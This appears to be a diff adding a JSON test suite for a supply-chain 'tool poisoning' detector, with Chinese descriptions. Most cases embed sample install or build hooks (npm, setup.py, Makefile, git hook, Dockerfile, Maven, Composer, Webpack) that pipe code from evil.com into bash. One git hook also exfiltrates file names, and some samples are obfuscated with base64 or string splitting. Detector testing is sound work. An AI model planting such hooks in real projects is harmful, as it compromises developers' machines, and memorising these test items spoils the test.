@@ -1,0 +1,511 @@
+[
+  {
+    "id": "TP-F01",
+    "name": "NPM postinstall 恶意脚本检测",
+    "type": "functionality",
+    "category": "TOOL_POISONING",
+    "severity": "high",
+    "description": "检测 NPM 包 postinstall 脚本中的恶意代码执行",
+    
+    "input": {
+      "file": "samples/ready/tool_poisoning/npm_malicious/package.json",
+      "content": "{\n  \"name\": \"malicious-pkg\",\n  \"version\": \"1.0.0\",\n  \"scripts\": {\n    \"postinstall\": \"node postinstall.js\"\n  }\n}"
+    },
+    
+    "expected": {
+      "detected": true,
+      "risk_score": 85,
+      "rules_matched": ["TP-YARA-001", "TP-RUNTIME-001"],
+      "indicators": ["postinstall script", "child_process.exec"]
+    },
+    
+    "sample_code": "const { exec } = require('child_process');\nexec('curl http://evil.com/malware.sh | bash');",
+    
+    "created_at": "2026-03-17T20:40:00Z"
+  },
+  
+  {
+    "id": "TP-F02",
+    "name": "Python setup.py 投毒检测",
+    "type": "functionality",
+    "category": "TOOL_POISONING",
+    "severity": "high",
+    "description": "检测 Python 包 setup.py 中的恶意安装脚本",
+    
+    "input": {
+      "file": "samples/ready/tool_poisoning/python_malicious/setup.py",
+      "content": "from setuptools import setup\nimport subprocess\nsubprocess.run(['curl', '-s', 'http://evil.com/install.sh', '|', 'bash'], shell=True)"
+    },
+    
+    "expected": {
+      "detected": true,
+      "risk_score": 90,
+      "rules_matched": ["TP-YARA-002", "TP-RUNTIME-002"],
+      "indicators": ["subprocess.run", "curl | bash", "shell=True"]
+    },
+    
+    "sample_code": "from setuptools import setup\nimport subprocess\nsubprocess.run(['curl', '-s', 'http://evil.com/install.sh', '|', 'bash'], shell=True)",
+    
+    "created_at": "2026-03-17T20:40:00Z"
+  },
+  
+  {
+    "id": "TP-F03",
+    "name": "Makefile 恶意命令检测",
+    "type": "functionality",
+    "category": "TOOL_POISONING",
+    "severity": "medium",
+    "description": "检测 Makefile 中的恶意下载和执行命令",
+    
+    "input": {
+      "file": "samples/ready/tool_poisoning/makefile_malicious/Makefile",
+      "content": "all:\n\tcurl -fsSL http://evil.com/script.sh | bash\n\tchmod +x malware\n\t./malware"
+    },
+    
+    "expected": {
+      "detected": true,
+      "risk_score": 75,
+      "rules_matched": ["TP-YARA-003"],
+      "indicators": ["curl | bash", "chmod +x"]
+    },
+    
+    "sample_code": "all:\n\tcurl -fsSL http://evil.com/script.sh | bash",
+    
+    "created_at": "2026-03-17T20:40:00Z"
+  },
+  
+  {
+    "id": "TP-F04",
+    "name": "Git Hook 恶意脚本检测",
+    "type": "functionality",
+    "category": "TOOL_POISONING",
+    "severity": "high",
+    "description": "检测 Git Hook 中的恶意脚本",
+    
+    "input": {
+      "file": "samples/ready/tool_poisoning/githook_malicious/.git/hooks/pre-commit",
+      "content": "#!/bin/bash\ncurl -s http://evil.com/hook.sh | bash\ngit diff --cached --name-only | base64 | curl -X POST -d @- http://evil.com/collect"
+    },
+    
+    "expected": {
+      "detected": true,
+      "risk_score": 88,
+      "rules_matched": ["TP-YARA-004"],
+      "indicators": ["git hook", "curl | bash", "base64 exfiltration"]
+    },
+    
+    "sample_code": "#!/bin/bash\ncurl -s http://evil.com/hook.sh | bash",
+    
+    "created_at": "2026-03-17T20:40:00Z"
+  },
+  
+  {
+    "id": "TP-F05",
+    "name": "Dockerfile 恶意指令检测",
+    "type": "functionality",
+    "category": "TOOL_POISONING",
+    "severity": "high",
+    "description": "检测 Dockerfile 中的恶意 RUN 指令",
+    
+    "input": {
+      "file": "samples/ready/tool_poisoning/dockerfile_malicious/Dockerfile",
+      "content": "FROM python:3.10\nRUN curl -s http://evil.com/install.sh | bash\nRUN chmod 777 /tmp\nCOPY . /app"
+    },
+    
+    "expected": {
+      "detected": true,
+      "risk_score": 82,
+      "rules_matched": ["TP-YARA-005"],
+      "indicators": ["curl | bash", "chmod 777"]
+    },
+    
+    "sample_code": "FROM python:3.10\nRUN curl -s http://evil.com/install.sh | bash",
+    
+    "created_at": "2026-03-17T20:40:00Z"
+  },
+  
+  {
+    "id": "TP-A01",
+    "name": "Base64 混淆检测绕过测试",
+    "type": "adversarial",
+    "category": "TOOL_POISONING",
+    "severity": "high",
+    "description": "测试 Base64 混淆是否能绕过检测",
+    
+    "input": {
+      "file": "samples/ready/tool_poisoning/obfuscated_b64/payload.py",
+      "content": "import base64\ncmd = base64.b64decode('Y3VybCAtcyBodHRwOi8vZXZpbC5jb20vbWFsd2FyZS5zaCB8IGJhc2g=').decode()\nexec(cmd)"
+    },
+    
+    "expected": {
+      "detected": true,
+      "risk_score": 80,
+      "rules_matched": ["TP-YARA-002", "TP-RUNTIME-003"],
+      "indicators": ["base64 decode", "exec"],
+      "evasion_technique": "base64_obfuscation"
+    },
+    
+    "sample_code": "import base64\ncmd = base64.b64decode('Y3VybCAtcyBodHRwOi8vZXZpbC5jb20vbWFsd2FyZS5zaCB8IGJhc2g=').decode()\nexec(cmd)",
+    
+    "created_at": "2026-03-17T20:40:00Z"
+  },
+  
+  {
+    "id": "TP-A02",
+    "name": "字符串拼接绕过测试",
+    "type": "adversarial",
+    "category": "TOOL_POISONING",
+    "severity": "medium",
+    "description": "测试字符串拼接是否能绕过检测",
+    
+    "input": {
+      "file": "samples/ready/tool_poisoning/obfuscated_concat/payload.py",
+      "content": "cmd = 'cur' + 'l -s http://evil.com/script.sh | ' + 'ba' + 'sh'\nimport os\nos.system(cmd)"
+    },
+    
+    "expected": {
+      "detected": true,
+      "risk_score": 75,
+      "rules_matched": ["TP-RUNTIME-004"],
+      "indicators": ["string concatenation", "os.system"],
+      "evasion_technique": "string_concatenation"
+    },
+    
+    "sample_code": "cmd = 'cur' + 'l -s http://evil.com/script.sh | ' + 'ba' + 'sh'\nimport os\nos.system(cmd)",
+    
+    "created_at": "2026-03-17T20:40:00Z"
+  },
+  
+  {
+    "id": "TP-B01",
+    "name": "边界测试 - 空文件",
+    "type": "boundary",
+    "category": "TOOL_POISONING",
+    "severity": "low",
+    "description": "测试空文件是否误报",
+    
+    "input": {
+      "file": "samples/ready/tool_poisoning/empty/setup.py",
+      "content": ""
+    },
+    
+    "expected": {
+      "detected": false,
+      "risk_score": 0,
+      "rules_matched": [],
+      "indicators": [],
+      "boundary": "empty_file"
+    },
+    
+    "sample_code": "",
+    
+    "created_at": "2026-03-17T20:40:00Z"
+  },
+  
+  {
+    "id": "TP-B02",
+    "name": "边界测试 - 正常 setup.py",
+    "type": "boundary",
+    "category": "TOOL_POISONING",
+    "severity": "low",
+    "description": "测试正常 setup.py 是否误报",
+    
+    "input": {
+      "file": "samples/ready/tool_poisoning/normal/setup.py",
+      "content": "from setuptools import setup\n\nsetup(\n    name='normal-package',\n    version='1.0.0',\n    py_modules=['main'],\n)"
+    },
+    
+    "expected": {
+      "detected": false,
+      "risk_score": 5,
+      "rules_matched": [],
+      "indicators": [],
+      "boundary": "normal_file"
+    },
+    
+    "sample_code": "from setuptools import setup\nsetup(name='normal-package', version='1.0.0')",
+    
+    "created_at": "2026-03-17T20:40:00Z"
+  },
+  
+  {
+    "id": "TP-B03",
+    "name": "边界测试 - 超大文件",
+    "type": "boundary",
+    "category": "TOOL_POISONING",
+    "severity": "medium",
+    "description": "测试超大文件处理性能",
+    
+    "input": {
+      "file": "samples/ready/tool_poisoning/large/large_file.py",
+      "size_mb": 10,
+      "content_hint": "10MB file with mixed benign and malicious code"
+    },
+    
+    "expected": {
+      "detected": true,
+      "risk_score": 70,
+      "rules_matched": ["TP-YARA-002"],
+      "indicators": ["subprocess in large file"],
+      "boundary": "large_file",
+      "max_latency_ms": 5000
+    },
+    
+    "created_at": "2026-03-17T20:40:00Z"
+  },
+  
+  {
+    "id": "TP-P01",
+    "name": "性能测试 - 批量扫描",
+    "type": "performance",
+    "category": "TOOL_POISONING",
+    "severity": "low",
+    "description": "测试批量扫描 100 个文件的性能",
+    
+    "input": {
+      "file_count": 100,
+      "file_type": "mixed",
+      "content_hint": "100 files with various tool poisoning patterns"
+    },
+    
+    "expected": {
+      "detected_count": 50,
+      "false_positive": 0,
+      "max_latency_ms": 10000,
+      "avg_latency_ms": 100
+    },
+    
+    "created_at": "2026-03-17T20:40:00Z"
+  },
+  
+  {
+    "id": "TP-I01",
+    "name": "集成测试 - 完整攻击链",
+    "type": "integration",
+    "category": "TOOL_POISONING",
+    "severity": "critical",
+    "description": "测试完整工具投毒攻击链检测",
+    
+    "input": {
+      "files": [
+        "package.json",
+        "postinstall.js",
+        "index.js"
+      ],
+      "combination": "npm_install + postinstall + exfiltration"
+    },
+    
+    "expected": {
+      "detected": true,
+      "risk_score": 95,
+      "rules_matched": ["TP-YARA-001", "DE-YARA-001", "RL-YARA-001"],
+      "indicators": ["postinstall", "curl | bash", "data exfiltration"],
+      "attack_chain": ["installation", "execution", "exfiltration"]
+    },
+    
+    "created_at": "2026-03-17T20:40:00Z"
+  },
+  
+  {
+    "id": "TP-I02",
+    "name": "集成测试 - 多阶段攻击",
+    "type": "integration",
+    "category": "TOOL_POISONING",
+    "severity": "critical",
+    "description": "测试多阶段攻击检测",
+    
+    "input": {
+      "stages": [
+        {"stage": 1, "action": "download", "file": "downloader.py"},
+        {"stage": 2, "action": "persist", "file": "persist.sh"},
+        {"stage": 3, "action": "exfil", "file": "exfil.py"}
+      ],
+      "combination": "download + persist + exfiltrate"
+    },
+    
+    "expected": {
+      "detected": true,
+      "risk_score": 98,
+      "rules_matched": ["RL-YARA-001", "TP-YARA-002", "DE-YARA-001"],
+      "indicators": ["multi-stage attack"],
+      "attack_chain": ["download", "persistence", "exfiltration"]
+    },
+    
+    "created_at": "2026-03-17T20:40:00Z"
+  },
+  
+  {
+    "id": "TP-F06",
+    "name": "pip install hook 检测",
+    "type": "functionality",
+    "category": "TOOL_POISONING",
+    "severity": "high",
+    "description": "检测 pip install 过程中的恶意 hook",
+    
+    "input": {
+      "file": "samples/ready/tool_poisoning/pip_malicious/setup.cfg",
+      "content": "[install]\ninstall_scripts=/tmp/malicious_install.sh\n\n[build]\nbuild_scripts=/tmp/malicious_build.sh"
+    },
+    
+    "expected": {
+      "detected": true,
+      "risk_score": 80,
+      "rules_matched": ["TP-YARA-006"],
+      "indicators": ["pip install hook", "malicious script path"]
+    },
+    
+    "sample_code": "[install]\ninstall_scripts=/tmp/malicious_install.sh",
+    
+    "created_at": "2026-03-17T20:40:00Z"
+  },
+  
+  {
+    "id": "TP-F07",
+    "name": "Ruby gemspec 投毒检测",
+    "type": "functionality",
+    "category": "TOOL_POISONING",
+    "severity": "high",
+    "description": "检测 Ruby gem 包中的恶意代码",
+    
+    "input": {
+      "file": "samples/ready/tool_poisoning/ruby_malicious/malicious.gemspec",
+      "content": "Gem::Specification.new do |s|\n  s.name = 'malicious-gem'\n  s.version = '1.0.0'\n  s.post_install_message = `curl -s http://evil.com/install.sh | bash`\nend"
+    },
+    
+    "expected": {
+      "detected": true,
+      "risk_score": 85,
+      "rules_matched": ["TP-YARA-007"],
+      "indicators": ["gemspec", "post_install_message", "curl | bash"]
+    },
+    
+    "sample_code": "s.post_install_message = `curl -s http://evil.com/install.sh | bash`",
+    
+    "created_at": "2026-03-17T20:40:00Z"
+  },
+  
+  {
+    "id": "TP-F08",
+    "name": "Go module 投毒检测",
+    "type": "functionality",
+    "category": "TOOL_POISONING",
+    "severity": "medium",
+    "description": "检测 Go module 中的恶意代码",
+    
+    "input": {
+      "file": "samples/ready/tool_poisoning/go_malicious/main.go",
+      "content": "package main\nimport (\n  \"os/exec\"\n  \"init\"\n)\nfunc init() {\n  exec.Command(\"curl\", \"-s\", \"http://evil.com/malware.sh\", \"|\", \"bash\").Run()\n}"
+    },
+    
+    "expected": {
+      "detected": true,
+      "risk_score": 78,
+      "rules_matched": ["TP-YARA-008"],
+      "indicators": ["go init function", "exec.Command", "curl | bash"]
+    },
+    
+    "sample_code": "func init() {\n  exec.Command(\"curl\", \"-s\", \"http://evil.com/malware.sh\", \"|\", \"bash\").Run()\n}",
+    
+    "created_at": "2026-03-17T20:40:00Z"
+  },
+  
+  {
+    "id": "TP-F09",
+    "name": "Java Maven 投毒检测",
+    "type": "functionality",
+    "category": "TOOL_POISONING",
+    "severity": "high",
+    "description": "检测 Maven pom.xml 中的恶意配置",
+    
+    "input": {
+      "file": "samples/ready/tool_poisoning/java_malicious/pom.xml",
+      "content": "<project>\n  <build>\n    <plugins>\n      <plugin>\n        <groupId>org.codehaus.mojo</groupId>\n        <artifactId>exec-maven-plugin</artifactId>\n        <executions>\n          <execution>\n            <phase>compile</phase>\n            <goals><goal>exec</goal></goals>\n            <configuration>\n              <executable>bash</executable>\n              <arguments>-c</arguments>\n              <argument>curl -s http://evil.com/malware.sh | bash</argument>\n            </configuration>\n          </execution>\n        </executions>\n      </plugin>\n    </plugins>\n  </build>\n</project>"
+    },
+    
+    "expected": {
+      "detected": true,
+      "risk_score": 88,
+      "rules_matched": ["TP-YARA-009"],
+      "indicators": ["maven exec plugin", "curl | bash"]
+    },
+    
+    "sample_code": "<executable>bash</executable><argument>curl -s http://evil.com/malware.sh | bash</argument>",
+    
+    "created_at": "2026-03-17T20:40:00Z"
+  },
+  
+  {
+    "id": "TP-F10",
+    "name": "PHP Composer 投毒检测",
+    "type": "functionality",
+    "category": "TOOL_POISONING",
+    "severity": "high",
+    "description": "检测 Composer 包中的恶意脚本",
+    
+    "input": {
+      "file": "samples/ready/tool_poisoning/php_malicious/composer.json",
+      "content": "{\n  \"name\": \"malicious/php-pkg\",\n  \"scripts\": {\n    \"post-install-cmd\": \"curl -s http://evil.com/malware.php | php\",\n    \"post-update-cmd\": \"@post-install-cmd\"\n  }\n}"
+    },
+    
+    "expected": {
+      "detected": true,
+      "risk_score": 86,
+      "rules_matched": ["TP-YARA-010"],
+      "indicators": ["composer post-install-cmd", "curl | php"]
+    },
+    
+    "sample_code": "\"post-install-cmd\": \"curl -s http://evil.com/malware.php | php\"",
+    
+    "created_at": "2026-03-17T20:40:00Z"
+  },
+  
+  {
+    "id": "TP-F11",
+    "name": "VSCode 扩展投毒检测",
+    "type": "functionality",
+    "category": "TOOL_POISONING",
+    "severity": "high",
+    "description": "检测 VSCode 扩展中的恶意代码",
+    
+    "input": {
+      "file": "samples/ready/tool_poisoning/vscode_malicious/package.json",
+      "content": "{\n  \"name\": \"malicious-vscode-ext\",\n  \"activationEvents\": [\"onStartupFinished\"],\n  \"main\": \"./out/extension.js\",\n  \"scripts\": {\n    \"vscode:prepublish\": \"node scripts/prepublish.js\"\n  }\n}"
+    },
+    
+    "expected": {
+      "detected": true,
+      "risk_score": 75,
+      "rules_matched": ["TP-YARA-011"],
+      "indicators": ["vscode extension", "prepublish script"]
+    },
+    
+    "sample_code": "\"vscode:prepublish\": \"node scripts/prepublish.js\"",
+    
+    "created_at": "2026-03-17T20:40:00Z"
+  },
+  
+  {
+    "id": "TP-F12",
+    "name": "Webpack 配置投毒检测",
+    "type": "functionality",
+    "category": "TOOL_POISONING",
+    "severity": "medium",
+    "description": "检测 Webpack 配置中的恶意插件",
+    
+    "input": {
+      "file": "samples/ready/tool_poisoning/webpack_malicious/webpack.config.js",
+      "content": "const { exec } = require('child_process');\nmodule.exports = {\n  plugins: [\n    new (class MaliciousPlugin {\n      apply(compiler) {\n        compiler.hooks.done.tap('MaliciousPlugin', () => {\n          exec('curl -s http://evil.com/malware.sh | bash');\n        });\n      }\n    })()\n  ]\n};"
+    },
+    
+    "expected": {
+      "detected": true,
+      "risk_score": 82,
+      "rules_matched": ["TP-YARA-012"],
+      "indicators": ["webpack plugin", "child_process.exec"]
+    },
+    
+    "sample_code": "compiler.hooks.done.tap('MaliciousPlugin', () => { exec('curl -s http://evil.com/malware.sh | bash'); });",
+    
+    "created_at": "2026-03-17T20:40:00Z"
+  }
+]
